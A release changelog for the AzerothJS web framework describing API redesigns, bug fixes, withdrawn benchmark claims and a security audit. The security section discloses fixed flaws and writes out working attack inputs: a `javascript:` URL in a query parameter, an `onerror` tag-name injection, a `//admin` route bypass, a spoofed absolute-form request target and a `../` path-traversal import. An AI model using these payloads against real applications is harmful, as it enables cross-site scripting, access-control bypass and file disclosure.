  api layer; `@azerothjs/schema`'s `Issue` is now the single declaration, imported type-only
  everywhere else. `ValidationIssue` is gone from the http surface - it was `Issue` under a
  second name. The wire envelope is likewise spelled in one function, so the pre-encoded 404
  literal and the real serialization path cannot drift.

- **`readValidated` accepts any Standard Schema validator.** The kernel's boundary reader and
  the api layer's `register` now run the SAME unification (`safeParse` fast path, `~standard`
  fallback), living in one place. A zod/valibot/arktype schema handed to `readValidated` is a
  422 with the flat field map, exactly as a native schema is.

### Added (compiler, azerothjs, language-server) - host `ref` gets the full contract, not just a type

- **`ref={ ... }` on a host element now types its value from the tag AND its namespace, under the
  runtime's own value rule.** The projection emitted the value untyped (implicit `any`, hand
  annotations nothing checked), so a first cut added an `AzerothRef<'tag'>` satisfies - and an
  adversarial audit of that cut found the type transcribed the wrong contract. The shipped design
  derives both halves from their owners:
  - the VALUE rule is `applyRef`'s exact accepted set - a callback, a `createRef()` box, or
    null/undefined/false for "no ref" (the handler convention, so `ref={ open && cb }` needs no
    ternary). `AzerothHandler` now encodes the same nil tolerance the GRAMMAR always documented
    and `attachEvent` always implemented - the gate used to reject `onClick={ open && fn }`, a
    program the specification blesses;
  - the ELEMENT type follows the markup namespace, the same rule the HTML parser applies: `<a>`
    inside `<svg>` is an `SVGAElement` (the HTML-map-first lookup certified `e.href = "x"`, which
    throws at mount), `<mi>` inside `<math>` is a `MathMLElement` (the HTML fallback certified
    `e.click()`, which threw in Chromium - MathML is the parser's other foreign branch, with the
    text integration points `mi`/`mo`/`mn`/`ms`/`mtext` and literal-encoded `annotation-xml`
    re-entering HTML), `<foreignObject>` children return to HTML, HTML tag lookups lowercase
    (`<dIv>` is a div), and unknown or custom-element tags give the context's base element -
    the old `Element` fallback rejected the correct annotation on every custom element.
- **A bare or string-valued host `ref` is a compile error** (`azeroth/ref-value`): it can never
  receive the element, and the clone path stamped a literal `ref` attribute into the document
  while SSR dropped it - a mode divergence now closed by rejection. Dynamic garbage
  (`ref={ someString }`) throws one rule text from the client renderer and the serializer alike,
  exactly as handler values do; it used to be silently swallowed.
- **`createRef` boxes any element** (`Ref<T extends Element>`): the runtime always did; only the
  type bound forbade `createRef<SVGCircleElement>()`.
- **A refused ref is reported as a ref failure** (`azeroth/ref-type`) in the azeroth-tsc gate and
  the editor - both had hard-coded "a 1360 is always a handler" and labeled ref failures "Event
  handler must be a function". The classifier is exported beside the decl that owns the name, so
  the three consumers cannot drift.
  On a component tag `ref` stays an ordinary prop throughout.

### Fixed (azerothjs) - the render-safety gate refused inline SVG images

- **`data:image/svg+xml` is now accepted on `<img src>` and `<video poster>`.** The gate refused
  every SVG data URL on the grounds that an SVG document carries script - true where the browser
  loads it AS a document, but not in an image context, where the spec's secure static mode
  disables scripting, external references, and navigation. The blanket refusal broke legitimate
  inline vectors, EIP-6963 wallet icons among them (that standard REQUIRES the icon to be a data
  URI). The rule is now tag-aware: those two attributes accept it, and `<a href>`, `<iframe src>`,
  `<use xlink:href>`, `<video src>` and every other URL attribute still refuse it. Both writers
  pass the tag, so the DOM path and the serializer decide identically.

### Added (azerothjs + compiler) - markup-native `<Dynamic>`

- **`<Dynamic component={ ... }>` now works from markup, and accepts element TAG strings.**
  Two halves, found dogfooding an icon component. First: `component` joins the factory-prop
  set (like `fallback`), so markup emits the CALLABLE the runtime contract expects - a plain
  getter made the runtime invoke the resolved value itself, which called a component with no
  props or crashed on a non-function. Markup and the manual `Dynamic({ component: view })`
  API now present the same shape. Second: the getter may return a tag STRING (`'path'`,
  `'div'`), rendered through h()'s namespace-aware builder - which is what lets data-driven
  node lists (`[tag, attrs][]`, the lucide shape) project from markup instead of forcing the
  component down to hand-written h(). Pinned by a codegen spec (the factory emission) and a
  renderer spec (string tags land in the SVG namespace, swaps included).

  The full contract, pinned by a contract matrix in the renderer specs:

  - **The selection is memoized (Object.is).** The subtree is torn down and rebuilt only
    when the resolved value CHANGES; a dependency of the component expression re-firing
    to the same result (`count() > 0 ? 'ul' : 'p'` moving 1 -> 2) never disturbs the
    subtree or its state. This is Solid's exact shape; the equality gate is what makes
    teardown-on-rerun correct.
  - **`props` accepts a plain object OR a thunk - one contract.** Markup `props={ node[1] }`
    and `props={ () => bag() }` both work; both read untracked at the swap (the untrack
    wraps the property READ, so a bare-object markup getter evaluates there). An object is
    a caller-owned snapshot. A thunk is LIVE per property read, key set fixed per
    selection, and every read routes through the CURRENT `props` value - swapping the
    thunk itself (`props={ dark() ? darkProps : lightProps }`) is as live as the values
    inside one. A child tracking a prop in its own scope updates in place with no rebuild:
    the same delivery direct markup gives, and the same React, Solid, and Vue give
    dynamic children.
  - **Invalid selections fail loudly.** A truthy non-function/non-tag (a pre-created
    node, an object) throws a named `<Dynamic>` error instead of a cryptic
    "not a function" from deep inside an effect. Falsy values (null/undefined/false)
    all mean "render nothing" and recover.
  - **Factory emission is the COMPONENT's contract, never the prop NAME's.** Emission
    gates on the tag (`isFactoryProp`: the builtins plus `Routes`), so a USER component
    with a value prop merely called `fallback` or `component` receives the plain value,
    never a thunk.

  Composition is pinned by specs rather than argued: selecting `Portal` escapes inline
  flow AND the swap's branch dispose reaches the escaped DOM (owner disposal does too);
  a resource-backed component under explicit `Suspense` is the whole lazy() pattern -
  async never touches Dynamic, because suspension is declared on Suspense (`on:`), so a
  future `lazy(loader)` is a stable component identity and the memoized selection holds
  through loading; a TAG selection serializes on the server (bare-object props included)
  through the same string-mode h(); recursive self-selection works. The module doc
  carries the seven numbered INVARIANTS a reimplementation must preserve; everything
  else in the file is declared implementation detail. Static-literal selections remain
  open to constant folding in codegen - the callable contract carries the literal
  visibly, so that optimization needs no contract change.

### Fixed (compiler) - `<For>` rows, found by a real application

- **A `<For>` row rooted at a COMPONENT keeps its getter rewrite.** `(item) => <Card
  item={ item } />` takes the pass-through path - the row is not a clonable element
  template - and that path dropped the captured param span, so `rowItems` was never
  built for the child's emission. The visible failures were ugly in exactly the way a
  silent type hole is: the child component received the raw row GETTER (every property
  read `undefined`), and a row variable inside a template literal stringified the
  getter's function body into the page. The param is now captured on the pass-through
  path too (`renderParamSpan`, the same reading `rowItemNames` does), so `item={ item }`
  emits `item()` and stays live per row.

- **A `<For>` EMBEDDED in a component prop expression keeps the row rewrite.** Markup
  inside a prop value (`fallback={ <ul><For ...>...</For></ul> }`) compiles in raw mode:
  the single reactive rewrite is deferred to the enclosing pass, which walks plain
  lowered text and had no IR to learn a row param from - so `row.label` inside such a
  For stayed a value read of the getter object. The row-param knowledge now crosses the
  text boundary the way nested keywords already do: the raw emission wraps the render
  arrow in a reserved `__azRow(...)` marker (the `__azMemo`/`__azSignal` pattern), the
  walk scopes the wrapped arrow's params as row items - innermost-first, so an interposed
  local of the same name still wins - and the rewrite strips the wrapper. Markers never
  reach emitted code.

  Recognition deliberately rides the marker and NEVER the `For` name: the runtime `For`
  is public manual API, and a hand-written `For({ children: (item) => ... })` callback
  receives getters the author already calls - a name-based rewrite would turn that
  legitimate `item()` into `item()()`. A negative spec pins the manual call untouched. The two mechanisms cannot double-fire on one occurrence: both
  are chosen by the same raw-mode flag at the single children-emission site - immediate
  IR rewrite when not raw, marker when raw.

  Both bugs were found building a production-shaped application (a market UI whose cards
  are component-rooted rows) and are pinned by codegen specs: component-rooted row,
  embedded For (marker-free output), nested For composing both mechanisms, and the
  hand-written `For({...})` negative.

### Fixed (http router + api) - found by the migration acceptance

- **A route segment declaring two parameters now fails registration loudly.** `:base...:head`
  (compound compare syntax) registered as ONE param named the whole text, so neither `base` nor
  `head` ever existed and every request could only 404 - found sitting silently broken in a real
  application. The boot error names both ways out (separate segments, or one param parsed in
  the handler). A single param with a compound VALUE (`/compare/:range` split on `...`) keeps
  the one-segment URL and actually works.

- **`HandlerContext` carries `path`.** The router-matched path was on the runtime object all
  along (a handler receives the SAME context a guard does) but the type hid it, forcing a cast
  the moment a handler passed its context to any `RequestContext`-typed helper.

### Fixed (azerothjs stream) - wire compatibility

- **The SSE parser now reassembles multi-line payloads correctly, and stops eating leading
  spaces.** A new weld spec pipes the server framer's output through
  `createStream({ parse: 'sse' })` - both public surfaces, `fetch` swapped for `app.handle` -
  and its FIRST run caught a real incompatibility: the framer splits a multi-line payload into
  multiple `data:` lines per the SSE grammar, and the parser joined them back WITHOUT the
  newline. Per the WHATWG spec (and EventSource), data lines in one event join with a single
  LF - they do now. The parser also stripped ALL leading whitespace after `data:` where the
  spec strips at most one space; a token stream whose separators ride as leading spaces was
  silently reflowed. Payloads now round-trip byte-exact, and the weld spec pins it.

### Changed (http api) - BREAKING

- **The contract trio is ONE concept now: `feature()`.** `defineContract` + `implement` +
  `mountApi` (plus the guards map, `only()`, `group`, `merge`, `route` and the six standalone
  verb helpers) are replaced by a single colocated declaration:

  ```ts
  export const api = {
      keys: feature('/keys', [requireAuth], (routes) => ({
          list:   routes.get('/', { output: keyList }, (context) => listKeys(context.accountId)),
          create: routes.post('/', { input: keyInput, output: keyRecord }, (context) => mint(context)),
          revoke: routes.del('/:keyId', {}, (context) => revoke(context.params.keyId))
      }))
  };
  register(app, api);
  ```

  The decision was measured, not aesthetic: building the same product both ways, colocation
  halved the files and the imported symbols, wrote each route's name once instead of three
  times, and collapsed seven concepts to three. What each deleted concept turned out to be:
  `defineContract` was key-assertion then `return shape`; `implement` was a type device that
  could not express per-route guards; the guards map was the third place a route's name was
  written and the source of two recorded defects; only `mountApi` did real work, and it
  survives as `register` - including the schema-failure -> 422 flat-field-map conversion and
  the ~standard sniffing that keeps zod/valibot/arktype boundaries a 422 rather than a 500.

  Guards move to where they read best: the feature chain covers every route; `routes.with(...)`
  REPLACES the chain for one declaration (nearest wins - what `only()` did, now visible at the
  route); `routes.with()` is the deliberate unguarded opt-out. Additions still flow typed into
  handler contexts, maybe-returning guards still type Partial, and interface-typed additions
  still survive - the proven inference machinery carried over.

  **Four route kinds are first-class**: `routes.form` (multipart with validated fields and caps),
  `routes.raw` (webhooks over raw bytes, downloads, `conditional()` 304s), and `routes.stream` (SSE)
  declare beside the JSON verbs, inherit the feature guard, and appear in the manifest and the
  OpenAPI document. Under the old contract these four were hand-mounted around the system,
  re-implemented their own authorization, and were invisible to the spec - the measured build's
  OpenAPI described 12 of its 16 routes and silently omitted the webhook and the stream.

  **The client is typed from `typeof` plus a manifest, not a runtime contract value.** The old
  design's justification - "types erase, so the client needs the contract value" - conflated
  "a type is not enough" with "a type plus two runtime fields per route is not enough".
  `manifestOf(features)` projects method + path per route (a few hundred bytes, no schemas, no
  functions) from the same declaration the server registered; `createClient<typeof api>` infers
  everything else. A browser bundle now imports server TYPES only - a feature holds handlers,
  and handlers hold your database.

  **Withdrawn, deliberately**: client-side pre-validation. The schemas no longer travel to the
  browser, so a bad input is caught at the server boundary (same 422, same `ApiError.fields`
  map into the form's `setError`) instead of before the wire. Input validation lives where
  input originates: `createForm({ schema })` already validates the form with the same schema -
  which is where it actually happened in real applications. Nothing fails to compile from this
  change; the behavior moves one hop. `ClientOptions.validateResponses` is gone with it.

  The old key-space failure (`implement` keying relative while `mountApi` keyed from the root -
  it compiled and failed at boot, with a diagnostic error explaining the split) is structurally
  impossible now: one set of names keys the routes object, the manifest, the client surface,
  and the installed endpoints. The spec that pinned the diagnosis now pins the impossibility.

### Removed - BREAKING

- **Four exports that were one-liners over another export.** Each did nothing its target could not,
  and each was a second name a reader had to learn, choose between, and hover to tell apart:

  - `toFetchHandler(app)` was `app.handle.bind(app)`. Its whole module is gone.
  - `acceptQuery(types)` was `{ 'accept-query': types.join(', ') }`.
  - `queryResult(data, opts)` was `json(data, { headers })` with three optional headers moved from
    the object literal into named options. QUERY routing itself is untouched - `app.query` and the
    contract's `query()` still exist; only the response sugar went.
  - `jsonSink` duplicated `@azerothjs/logger`'s `ndjsonSink` under a different name in a package
    that ships alongside it. It had no importer anywhere. The function survives as the kernel
    logger's private default, which is the only thing it was ever used for.

- **`@azerothjs/language-server/language-service` publishes 18 symbols instead of 70.** The entry
  exported the whole pipeline - `classifyPosition`, `collectMarkupNodes`, `LineIndex`, `StyleIndex`,
  `BUILTIN_COMPONENT_MAP`, `DOM_EVENTS`, `Metrics`, `containedPath`, `isVirtualFile`,
  `toAzerothPath`, and some thirty LSP protocol types - alongside the facade that uses them.

  Measured across every file in the repo and the editors that import this subpath, exactly 17 of
  those 70 were ever imported through it, and only five reach another package: `AzerothProject` and
  `toVirtualFile` (the ESLint parser), `generateVirtualCode`, `CodeMapping` and `containedSibling`
  (the TypeScript plugin). What remains is the facade, the options its methods take, the constants
  an editor echoes in its capabilities, and those five. The stages are how the service is BUILT,
  not how it is used; one that proves useful outside can be published on that evidence.

- **A dead completion-source plugin API in the language server.** `registerCompletionSource`,
  `clearCompletionSources` and the `CompletionSource` type were an extension point with no way to
  reach it: nothing in the repo, the editors, the templates or the docs ever registered a source, so
  the loop consuming the registry could never have a member. The internal fan-out that walked it went
  with them.

- **`setMetricsEnabled` and `getMetrics` module aliases**, which re-exported `perf.setEnabled` and
  `perf.snapshot` under names the language service already had as real methods. Two ways to reach one
  thing, one of them unreachable in practice; the class methods are unchanged.

- **`@azerothjs/eslint-plugin`'s named `rules` export.** The default export IS the plugin and carries
  `rules` on it. Every consumer, all three shipped templates included, imports the default.

- **`prettySink` from `@azerothjs/http`.** `@azerothjs/logger` exports a `prettySink` too, and the
  two were incompatible: that one is a FACTORY returning a sink, this one WAS a sink. Both packages
  appear in the same server file, so `createMinimalLogger({ sink: prettySink })` was correct with one
  import and silently installed a factory as the sink with the other.

  The justification for a private copy - that the kernel is zero-dependency - was not true:
  `@azerothjs/http` already declares `@azerothjs/logger` as a dependency and imports `printBanner`
  from it. The sink had no consumer beyond its own test, so it is gone rather than renamed. Reach for
  `@azerothjs/logger` when you want pretty output; `createMinimalLogger` keeps its private default.

- **The co-range placement machinery no longer ships on the `azerothjs` root.** `createCoMarkers`,
  `appendToCo`, `clearCo`, `adoptCoRange`, `resolveMountNode` and the `CoTarget` type are the
  comment-marker infrastructure the renderer's control-flow components build on. Their own barrel
  says outright "framework infrastructure consumed by the renderer, not app-facing API", but the
  root entry star-exported that barrel, so all six sat in application autocomplete beside
  `createSignal`. Nothing outside the package imports any of them; the root now names what it
  takes from the component layer (`destroyComponent`, `ErrorBoundary`). Compiled `.azeroth` output
  is unaffected - generated code imports from `azerothjs/internal`, which never carried them.

- **`playTransitionClasses` left the renderer barrel.** Its export comment claimed generated
  `.azeroth` output imports it; the compiler emits no such import - generated modules pull from
  `azerothjs/internal`, whose export list never had it. Its one caller is the router's route
  transition, inside the package. `<Transition>`, `<TransitionGroup>` and `Routes` transitions are
  untouched.

- **`@azerothjs/devtools` publishes `installDevtools`, not the parts it is assembled from.**
  `createAgent`, `previewValue` and `detectLeakTrend` are how the panel is built; every consumer of
  the three lives inside the package and imports the defining module directly. The agent's types
  stay exported, because the surviving surface references them.

### Fixed (http responses)

- **`redirect`, `noContent` and the bodyless arm of `created` can carry a `Set-Cookie`, and take the
  adapter's fast path.** All three built a plain `Response` instead of going through the kernel's
  response constructor, with two consequences.

  `redirect` had no `init` parameter at all, so a `Set-Cookie` could not be attached to a redirect
  in any way. Sign-out is "expire the session cookie AND redirect": a logout that redirects without
  clearing the cookie leaves the user signed in. `redirect(location, status, init)` now takes
  headers, and every cookie survives - header iteration collapses duplicate `Set-Cookie`, so a
  session and a CSRF cookie both reaching the socket depends on the `getSetCookie()` path the kernel
  response already implements.

  All three also lost the `PayloadResponse` fast path (`writeHead` + `end`, no web-stream), which
  made the two most common bodyless replies the slowest ones to write. A 204 still declares no
  `Content-Length` and no body, per RFC 9112 section 6.2.

### Fixed (http contract)

- **`query()` can declare a query-string schema, like every other verb.** Its definition type omitted
  the `query` field the five other helpers carried, so a QUERY route declared through `query()` could
  not describe its query string while the identical route declared through `route({ method: 'QUERY' })`
  could. The six verb helpers were six independent copies of one object literal, which is how the
  drift went unnoticed; they now delegate to `route()`, so a route object is built in exactly one
  place. The doc claiming they already did this - "the same relationship `app.route` has to
  `app.get`" - was aspirational: `App.get` does delegate, these did not.

### Changed (azerothjs dev/prod separation) - BREAKING

- **The devtools bridge moved off the root entry to `azerothjs/internal`.** `setDevtoolsHook`,
  `snapshotReactiveGraph`, `peekNode`, `pokeNode`, `DEVTOOLS_PROTOCOL_VERSION` and their eight
  types are framework infrastructure with exactly one consumer (`@azerothjs/devtools`, updated),
  and `pokeNode` writes arbitrary values into any registered signal - none of it belongs in
  application autocomplete. Import from `azerothjs/internal` if you are building an agent.

- **One `DEV` gate, honestly documented.** The runtime's dev checks now flow through a single
  module-level constant (computed once off `globalThis`), replacing three per-call probes - and
  the comment claiming the check "folds away in a production build" is corrected: a bundler's
  `define` of `process.env.NODE_ENV` matches the bare token, never a `globalThis` probe, so this
  is a runtime behavior switch, stated as such.

  Five advisory warnings that previously shipped ungated now run only in dev: the `<For>`
  duplicate-key warning, the nested-island and no-loader island warnings, the router search-schema
  degradation warning, and the transition `display: contents` probe - the last one also stops
  calling `getComputedStyle` on EVERY transition start in production, a per-animation cost that
  bought nothing outside dev.

  Two sites deliberately stay in production, upgraded to `console.error`: an island that throws
  while reviving and a route guard that throws (navigation vetoed). Both swallow an exception by
  design - graceful degradation - and a production incident with zero signal is worse than one
  log line.

### Changed (azerothjs renderer) - BREAKING

- **`<For>` hands the row builder GETTERS: `children: (item: () => T, index: () => number)`.** Under
  the by-value form, a row whose key survived while its item was REPLACED - the immutable-update
  pattern every store produces - kept rendering the values it was built from. The store was right,
  the screen was wrong, and nothing was logged. Two applications hit this independently, the second
  AFTER the trap was documented; it was the single highest-frequency defect found building real
  products on this framework. A dev warning shipped in 1.2; this is the fix. A replaced item now
  updates its row's live bindings in place - same element, no rebuild - verified in a real browser.

  `.azeroth` markup does not change: a row body still reads `item.name`, and the compiler emits the
  getter call (`item().name`), the same value-read idiom `state` and `form` fields already follow.
  The index param joins the same rule. Manual TypeScript callers add the calls: `item.name` becomes
  `item().name` in row builders; `key` still receives the value. The stale-row dev warning and the
  per-row item retention that powered it are DELETED - the trap they watched for is structurally
  impossible now.

  `VirtualList.children` moves in lockstep - and the getter contract fixed a latent bug of its own:
  a reused row's absolute `top` position was a static string, so an insertion above a visible row
  left it misplaced until a scroll. The position binding is reactive now.

### Changed (azerothjs SSR) - BREAKING

- **`renderToStaticMarkup` is gone; `renderToString` takes `{ markers }`.** They were the same
  private function called with `true` and `false`. Two names for one boolean is a choice a reader
  can get wrong in both directions - marker-laden HTML into an email, or marker-free HTML into a
  page that then fails to hydrate - and nothing but the name distinguished them at the call site.

  `renderToStaticMarkup(c)` becomes `renderToString(c, { markers: false })`. The capability is
  unchanged; `renderToDocument`'s `static` option still selects between them.


### Fixed (renderer events)

- **`event.currentTarget` in a compiled component is the element again, not the document.**
  Markup handlers lower to `bindEvent`, which routes bubbling types through one document-level
  listener. The browser sets `currentTarget` to the node whose listener is running - the document -
  and the dispatcher fixed up `this` but never `currentTarget`. Since markup handlers are arrow
  functions, and arrows have no `this`, `currentTarget` is the only way a handler can reach its own
  element, so every one of them received the wrong node.

  It failed loudly on methods the document lacks (`event.currentTarget.setPointerCapture(...)`, the
  standard way to make a drag survive the pointer leaving the element) and silently wherever the
  document happens to have the property, which is the worse half. `h()` was never affected - it
  attaches per-element listeners - so the two render paths disagreed, and a test written with `h()`
  cannot observe the bug. The regression test drives `bindEvent` for that reason.

  `currentTarget` is now defined for the duration of each handler call and the original descriptor
  restored afterwards, so a document-level listener registered by application code still observes
  the document.

### Fixed (control flow)

- **A keyed `<For>` warns in development when a reused row's data went stale.** A row is built once
  from the item it was handed and is not rebuilt while its key is unchanged. A list keyed by id
  whose rows display mutable fields therefore renders the values those fields held when the row
  first appeared, and never updates them - the store is right, the screen is wrong, and nothing is
  logged.

  The reconciliation itself is correct and unchanged; the trap is that reading a field off the item
  the row builder handed you is the natural way to write a row. The warning names the field that
  went stale and both remedies: fold the changing field into the key, or pass a getter and read it
  through a `derived`. It is development-only and folds away in a production build.

### Added (http)

- **`conditional()`, `etagFor()` and `matchesEtag()` - conditional JSON responses.** A polled
  endpoint is the most common thing an API serves and the most wasteful to serve unconditionally.
  These turn "nothing changed" into a bodyless 304, handling comma-separated `If-None-Match` lists,
  `W/` weak validators and `*`.

  `scope` is a REQUIRED option rather than an optional one. An entity-tag computed over the body
  alone means two callers whose rows happen to serialize identically share a validator, and handing
  one of them a 304 serves the other's data out of its cache. Naming what the response varies by
  turns a silent cross-tenant leak into a parameter that cannot be forgotten.

  The existing `matchesEntity` in static file serving is unchanged and stays private: it is
  specialized for files, understanding encoding-suffixed validators and `If-Modified-Since` dates.

### Fixed (logger sinks)

- **A stream handed where the options object belongs now throws instead of writing to stdout.**
  `prettySink` and `ndjsonSink` take `{ stream }`, so a bare stream became the options bag,
  `options.stream` read undefined, and the sink fell back to stdout - leaving the configured file
  empty and every line on the console, with nothing naming the cause. In production that reads as
  "logging is broken" while the evidence of the misconfiguration is the first thing lost.

  TypeScript already rejected the call (a writable has no properties in common with the options
  type), so this is the guard for a JavaScript caller. `prettySink()`, `prettySink({})` and
  `prettySink({ stream })` are unchanged.

### Fixed (contract mount diagnostics)

- **A group-relative handler map mounted against the whole contract now names the mistake.**
  `implement(routes, ...)` keys its result relative to the routes it was passed - the only key
  space a feature file can know - while `mountApi(app, contract, ...)` keys from the contract root.
  Spreading the first into the second compiles and fails at boot, and the old error reported a
  generic "route has no handler", leaving the reader to work out that the two halves of one feature
  count from different places.

  The mount now checks whether the BARE key is present, which is exactly this mismatch and nothing
  else, and says so - naming both ways out, including the `mountApi(app, contract.<group>, ...)`
  call that fixes it. A genuinely missing handler still reports plainly, with no misleading hint.

  Found by building a realistic multi-feature application rather than a demo: the mismatch does not
  appear until a contract has more than one group, which is why no existing project surfaced it.
  The underlying design - two key spaces for one feature - is not addressed here.

### Changed (contract client)

- **The typed client now reports every failure as `ApiError`.** It validates input locally before
  sending - deliberately, since that failure costs no network - but threw `SchemaError` for the
  local case and `ApiError` for a server refusal. One logical failure ("validation failed")
  arrived as two types with different shapes, and only the server one carried `status`/`code`.

  That is why a real application accumulates a dozen copies of
  `err instanceof Error && err.message !== '' ? err.message : 'fallback'`: `instanceof ApiError`
  genuinely does not catch client-side validation, so reaching for the typed error does not work
  and duck-typing is the rational response. **The typed error was unreachable in the exact case it
  was designed for**, which was only visible once a realistic application was built against it.

  Local validation now reports `status: 422` and `code: 'validation-failed'` - the same pair the
  server sends for the same failure - and keeps the form-ready `fields` map that made
  `SchemaError` worth catching. A caller cannot tell where the failure was caught, and no longer
  needs to. **BREAKING** for anyone catching `SchemaError` from a client call; catch `ApiError`.

### Fixed (logger, compiler, public types)

- **A logger name containing a regex character deleted other writers' files.** Folder-mode
  retention interpolated the configured `name` straight into the pattern that decides what
  `unlinkSync` removes, so the name acted as a pattern rather than a literal: `[a-c]` matched
  `a-`, `b-` and `c-`, and the likelier `api.v2` matched `apiXv2`. Reproduced - a sink named
  `[a-c]` pruned two files belonging to unrelated services sharing the directory. Not remotely
  exploitable, since `name` is developer configuration and never request data, but escaping an
  interpolated value costs one call and a name should select its own files and nothing else.

- **Five types were public in effect but not nameable.** Each appears in an exported signature or
  union while the package entry never re-exported it, so a consumer could call the function but
  not write down its parameter or narrow its result: `RouteDecodeError` and
  `StreamMultipartOptions` from `@azerothjs/http`, and `TypeCheckOptions`, `MarkupOutput` and
  `OpaqueStatements` from `@azerothjs/compiler`. `RouteDecodeError` is the member added to
  `RouteResult` earlier in this release, so nobody could narrow the union it joined.

- **The compiler's attribute escaper now matches the runtime's.** It escaped `&` and `"` where the
  runtime escapes `&`, `"`, `<` and `>`. Both are safe inside a quoted value and the compiler's
  only ever sees author-written static markup - but two functions with one name and different
  escape sets is a trap for whoever first routes dynamic content through the wrong one.

### Corrected (performance claims)

- **The "ahead of Fastify on the five-scenario geometric mean (~4%)" claim in [0.9.0-beta.1] does
  not hold and is withdrawn.** Re-measured with the same stated methodology (autocannon, 100
  connections, interleaved same-machine A/B, 3 runs x 8s), `@azerothjs/http` is **~5% behind**
  Fastify on that geomean, reproducibly: -5.5%, -4.1% and -6.2% across three runs, and -4.2% at 50
  connections. The measurement used a rebuilt interleaved A/B harness linked to the local packages,
  persisting a JSON artifact per run (Node version, platform, settings, per-scenario medians and
  every individual run). The original harness sat in an untracked sibling directory and wrote
  nothing at all, so the number outlived its evidence - which is why this went unnoticed for three
  minor versions, and why any future claim needs a stored artifact behind it.

  Three findings that should not be collapsed into each other:

  - **The security work accounts for part of the gap, not all of it.** The same benchmark against
    `8bf1c71` (before both audits) gives ~-2%, so the two security commits cost roughly 3 points.
    The pre-audit code was already behind, so the fixes did not turn a lead into a deficit.
  - **The original claim was measured against 0.8.0-beta.2**, whose handler signature no longer
    exists: its server entry used the two-argument `(request, ctx)` form and imported `serve` from
    the package root. That entry cannot run on 1.1.0 at all, so the old numbers describe a
    materially different framework and were never re-earned across the 1.0 API change.
  - **Run duration changes the sign.** At 2 seconds the same comparison reports azerothjs ~4%
    ahead; at 8 seconds it reports ~5% behind, because a short run never reaches steady state. The
    published figure is close to what a too-short run produces.

  Still unverified against 1.1.0 and NOT re-measured here: the Express/Koa/Nest comparisons in the
  same entry. The js-framework-benchmark and `ws` claims were checked against their stored raw data
  and do hold - but for 0.8.0-beta.2, not for the current release.

- **Measured cost of the security work on the paths it touched.** Three commits compared in one
  process, interleaved, 21 rounds, medians with interquartile bands: SSR render **-8% to -13%**
  (real - the renderer safety gate is the XSS defence that caught two criticals, so the cost is
  accepted, and now documented rather than assumed); HTTP dispatch **-4% to -7%** (borderline, the
  verdict moved between runs); WebSocket frame parsing **+77% to +82%** (a real improvement, from
  the first audit's parser rewrite).

### Security (second adversarial pass: fuzzing, differential testing, editor tooling)

A second audit attacked the framework by RUNNING it rather than reading it: 16 million seeded
fuzz cases against invariance oracles, and behavioural comparison against React, Express,
Fastify, Hono and Koa on identical input. It also opened the packages the first pass never did.
Two things stand out. The fixes from the first pass were themselves the largest unreviewed
surface, and the renderer's safety gate - written in that pass - had the two worst holes found
here. And where a guarantee was judged by a value's declared TYPE rather than by the bytes that
actually get written, the gate could be walked around.

- **Any prop carrying a `javascript:` URL rendered live unless it was a string.** `assertSafeUrl`
  tested `typeof candidate === 'string'`, while both writers end in `String(value)`. A
  one-element array, a `String` object, or anything with a `toString` walked past every URL
  attribute - `href`, `src`, `action`, `formaction`, `poster`, `data`, `xlink:href`. An array is
  the realistic carrier: `?next=javascript:alert(1)&next=x` yields one from every mainstream
  query parser. The string form threw, so the policy was never in doubt, only its reach. The gate
  now judges the coerced value. React neutralizes the same input; AzerothJS was the looser of the
  two, which is what made it a defect rather than a difference.

- **Tag names were never validated, only checked against a refused-name set.** `serializeElement`
  interpolates the name straight into `<...>`, so `h('img src=x onerror=alert(1)', {})` emitted
  that verbatim and the browser parsed the attributes back out. Confirmed executing in Chromium.
  `document.createElement` rejects the same name, so the DOM path failed safe and only SSR
  injected - precisely the server/client split the gate exists to prevent. Tag names now have to
  be tag names, including through `unsafeTag()`, which authorizes a refused TAG and was never
  meant to authorize arbitrary markup.

- **An `on*` prop was skipped case-sensitively but gated case-insensitively.** `ONCLICK` or
  `OnClick` carrying a real handler missed the skip, so the renderer CALLED it to see what it
  returned - running a click handler on the server, once per render - and then reported that an
  `on*` prop must be a function, which it was.

- **`//admin` reached the `/admin` handler.** The router dropped every empty path segment, so
  `//admin`, `/admin//panel` and `/admin/panel//` all resolved to the protected route.
  Differential testing put AzerothJS alone in this: Express, Fastify, Hono and Koa all 404, and
  RFC 3986 6.2.2 does not list empty-segment removal among the normalizations that preserve
  equivalence. Being the permissive outlier is what made it exploitable, in two directions: a
  proxy or WAF rule keyed on `^/admin` does not match `//admin` and forwards it, and an in-app
  guard on `context.url.pathname` - the standard accessor, not the framework-specific
  `context.path` - sees a string that fails `startsWith('/admin')` while the handler still runs.
  Empty segments are no longer collapsed. Trailing-slash equivalence is unchanged; it cannot
  shift a prefix. **This is a breaking routing change**: a client that spells a path with a
  doubled slash now gets a 404.

- **An absolute-form request target was concatenated onto our own authority.**
  `GET http://evil.com/admin HTTP/1.1` became `http://thttp://evil.com/admin`, whose path is
  `//evil.com/admin` and whose host is a fabricated `thttp`. RFC 9112 3.2.2 requires a server to
  accept absolute-form and 3.3 says the target IS the request-target. Three consequences, all
  live: the request routed to the wrong resource, `request.url` was not a legal URL, and
  `context.url.host` reported an authority no client sent, so a host check written on it compared
  against garbage. The path is now taken from the target; the authority deliberately is not,
  because letting the request line choose the origin is worse than the bug.

- **`App.handle` could resolve with something that is not a Response.** Its docblock promises
  that it "cannot throw and cannot reject; every failure becomes an error Response", and its
  signature says `Promise<Response>`. The throw path honoured that; the return path did not. An
  async handler that forgets to `return` on one branch resolved the request with `undefined` -
  the most common handler mistake there is. Nothing rejected, so `onError` never fired and an
  observer recorded a success.

- **The editor tooling had no path containment at all.** A `.azeroth` file in a repository
  someone cloned is untrusted input, and both module resolvers handed
  `path.resolve(dirname(importer), specifier)` straight to the filesystem, with no containment
  check of any kind (the specifier test also admits a root-relative `/...`, which resolves outside
  the workspace; a Windows drive-letter path was never admitted, so `..` is the escape that
  matters). `import x from '../../../../secret.azeroth'` was resolved,
  read, compiled, and its string literals rendered into a hover tooltip; `document-links` probed
  arbitrary paths with `fileExists` and emitted a link only when one existed, which is an
  existence oracle with a clickable `file://` target. The check that was missing is the one
  `@azerothjs/http`'s static handler already applies to a request path, and it is now shared:
  containment on the resolved path, then on what the filesystem really resolved, so an in-tree
  symlink cannot point out of the tree.

- **A 405 advertised an `Allow` set missing a method the server answers.** The router serves HEAD
  off a GET registration, but the set was built from raw handler keys, which never contain HEAD.
  RFC 9110 10.2.1 defines `Allow` as the methods the resource supports; clients act on it.

